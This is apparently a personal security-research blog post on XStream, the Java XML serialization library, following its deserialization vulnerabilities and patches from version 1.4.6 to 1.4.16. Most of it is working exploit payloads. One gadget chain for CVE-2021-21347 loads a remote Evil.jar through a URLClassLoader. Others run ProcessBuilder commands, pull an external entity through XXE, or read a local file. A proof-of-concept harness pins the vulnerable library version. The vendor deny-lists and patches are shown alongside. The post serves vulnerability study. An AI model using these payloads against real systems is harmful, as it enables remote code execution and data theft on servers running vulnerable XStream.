---
layout: post
title: LIFECYCLE of XSTREAM
categories: [Research]
tags: [XSTREAM,JAVA]
description: Something about XSTREAM lib
---

### Brief intro

* Is:

XStream is a simple library to serialize objects to XML and back again.

* Ref:

[1] [XSTREAM](http://x-stream.github.io/index.html)

[2] [Standard way to serialize and deserialize Objects with XStream](http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.YKHnwagzb4Y)

[3] [xstream-remote-code-execution-exploit](http://diniscruz.blogspot.com/2013/12/xstream-remote-code-execution-exploit.html)

[4] [XStream deserialization vulnerability research](https://www.programmersought.com/article/55115038764/)

* Self Question:

```
- What is the proxy?
- How can build payload invoke method dynamic?
```

### Read & Practice

* Life cycle:

[Workaround of XSTREAM from version 1.4.6 to higher 1.4.16](http://x-stream.github.io/security.html#workaround)

* Payload:

<u>*CVE-2021-21347*</u>

{% highlight java %}
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>Evil</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='java.net.URLClassLoader'>
                  <ucp class='sun.misc.URLClassPath'>
                    <urls serialization='custom'>
                      <unserializable-parents/>
                      <vector>
                        <default>
                          <capacityIncrement>0</capacityIncrement>
                          <elementCount>1</elementCount>
                          <elementData>
                            <url>http://127.0.0.1:80/Evil.jar</url>
                          </elementData>
                        </default>
                      </vector>
                    </urls>
                    <path>
                      <url>http://127.0.0.1:80/Evil.jar</url>
                    </path>
                    <loaders/>
                    <lmap/>
                  </ucp>
                  <package2certs class='concurrent-hash-map'/>
                  <classes/>
                  <defaultDomain>
                    <classloader class='java.net.URLClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <initialized>true</initialized>
                  <pdcache/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>-2147483648</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
{% endhighlight %}



### Code to rebuild

pom.xml

{% highlight java %}
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>groupId</groupId>
    <artifactId>learn-XSTream</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>
    <dependencies>
        <dependency>
            <groupId>com.thoughtworks.xstream</groupId>
            <artifactId>xstream</artifactId>
            <version>1.4.5</version>
        </dependency>
    </dependencies>
</project>
{% endhighlight %}

buildPoC.java

{% highlight java %}
import java.io.IOException;

public class buildPoC {
    public static void main(String[] args) throws IOException
    {
        String process = "calc.exe";
        String payload = "<sorted-set>" +
                "<string>foo</string>" +
                "<dynamic-proxy>" +
                "<interface>java.lang.Comparable</interface>" +
                "<handler class=\"java.beans.EventHandler\">" +
                "    <target class=\"java.lang.ProcessBuilder\">" +
                "         <command>" +
                "             <string>" + process + "</string>" +
                "        </command>" +
                "    </target>" +
                "    <action>start</action>" +
                "</handler>" +
                "</dynamic-proxy>" +
                "</sorted-set>";

        XMLGenerator.generateTOfromXML(payload);

        System.out.println("Will not get here");
    }
}
{% endhighlight %}

### History

#### 1.4.6

> In version, Users can register an own converter for dynamic proxies like  *java.beans.EventHandler* type or  *java.lang.ProcessBuilder* type lead to execute code

* Payload:

{% highlight java %}
<contact class='dynamic-proxy'>
  <interface>java.lang.Comparable</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
{% endhighlight %}

* Patch:

*Using blacklist:* `type != null && (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type)`

#### 1.4.8

> Library parsing of XML is default can called to DTD internal or extenal. The feature prevent XXE turn off.

* Payload:

{% highlight java %}
               "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo [  \n" +
                "<!ELEMENT foo ANY>\n" +
                "<!ENTITY xxe SYSTEM \"http://127.0.0.1:1231\">]><foo>&xxe;</foo>";
{% endhighlight %}

* Patch:

> Set feature `disallow-doctype-decl` to `true` avoid called to entity. If in payload, exists tag `DOCTYPE`, Exception occur with error DOCTYPE is disallowed.

\com\thoughtworks\xstream\io\xml\DomDriver.class#116

{% highlight java %}
 Method method = DocumentBuilderFactory.class.getMethod("setFeature", String.class, Boolean.TYPE);
 method.invoke(factory, "http://apache.org/xml/features/disallow-doctype-decl", Boolean.TRUE);
{% endhighlight %}

#### 1.4.9

#### 1.4.13

* Payload:

{% highlight java %}
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='java.io.SequenceInputStream'>
                            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                <iterator class='javax.imageio.spi.FilterIterator'>
                                    <iter class='java.util.ArrayList$Itr'>
                                        <cursor>0</cursor>
                                        <lastRet>-1</lastRet>
                                        <expectedModCount>1</expectedModCount>
                                        <outer-class>
                                            <java.lang.ProcessBuilder>
                                                <command>
                                                    <string>calc.exe</string>
                                                </command>
                                            </java.lang.ProcessBuilder>
                                        </outer-class>
                                    </iter>
                                    <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>start</name>
                                    </filter>
                                    <next/>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class='java.io.ByteArrayInputStream'>
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
{% endhighlight %}

* patch

\com\thoughtworks\xstream\security\NoPermission.class

{% highlight java %}
    public boolean allows(Class type) {
        if (this.permission != null && !this.permission.allows(type)) {
            return false;
        } else {
            throw new ForbiddenClassException(type);
        }
    }
{% endhighlight %}

Classes that execute code directly have been restricted. Indirect attack vectors such as RMI, LDAP protocol classes are implemented.

Adding blacklist:

```
DenyType:
0 = "java.beans.EventHandler"
1 = "java.lang.ProcessBuilder"
2 = "javax.imageio.ImageIO$ContainsFilter"
DenyRegex:
"javax\\.crypto\\..*
.*\\$LazyIterator
```

#### 1.4.14

* Payload:

{% highlight java %}
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>
                            <tempFile>F:\Research\java\XSTream\learn-XSTream\src\main\java\XSTreamm\PoC\flag.txt</tempFile>
                        </is>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
{% endhighlight %}

* Patch

Adding DenyRegex & denyType:

```
jdk.nashorn.internal.objects.NativeString
.*\.ReadAllStream\$FileStream
```

#### 1.4.15

* Patch

```
xstream.denyTypes(new String[]{ "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "sun.swing.SwingLazyValue", "com.sun.corba.se.impl.activation.ServerTableEntry", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator" });
xstream.denyTypesByRegExp(new String[]{ ".*\\$ServiceNameIterator", "javafx\\.collections\\.ObservableList\\$.*", ".*\\.bcel\\..*\\.util\\.ClassLoader" });
xstream.denyTypeHierarchy(java.io.InputStream.class );
xstream.denyTypeHierarchy(java.nio.channels.Channel.class );
xstream.denyTypeHierarchy(javax.activation.DataSource.class );
xstream.denyTypeHierarchy(javax.sql.rowset.BaseRowSet.class );
```

#### 1.4.16

* Patch

````
Regex:
0 = {Pattern@1496} ".*\$LazyIterator"
1 = {Pattern@1497} ".*\$GetterSetterReflection"
2 = {Pattern@1498} ".*\$PrivilegedGetter"
3 = {Pattern@1499} "javax\.crypto\..*"
4 = {Pattern@1500} ".*\$ServiceNameIterator"
5 = {Pattern@1501} "javafx\.collections\.ObservableList\$.*"
6 = {Pattern@1502} ".*\.bcel\..*\.util\.ClassLoader"
Type:
0 = "jdk.nashorn.internal.objects.NativeString"
1 = "java.beans.EventHandler"
2 = "sun.swing.SwingLazyValue"
3 = "com.sun.corba.se.impl.activation.ServerTableEntry"
4 = "java.lang.ProcessBuilder"
5 = "sun.awt.datatransfer.DataTransferer$IndexOrderComparator"
6 = "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator"
7 = "javax.imageio.ImageIO$ContainsFilter"
````



### Ans

**<u>*1. What is the proxy?*</u>**

Follow the article [proxies in java static and dynamic](https://medium.com/@shohraafaque/proxies-in-java-static-dynamic-8ccc51d16346) to understand more about proxy. I can summary a bit:

> Provide proxy for Object to manage access into it.

- Include 2 type:
  + Dynamic proxy : Exist in JVM runtime,
  + Static proxy : Proxies that are written manually,exist in compile time.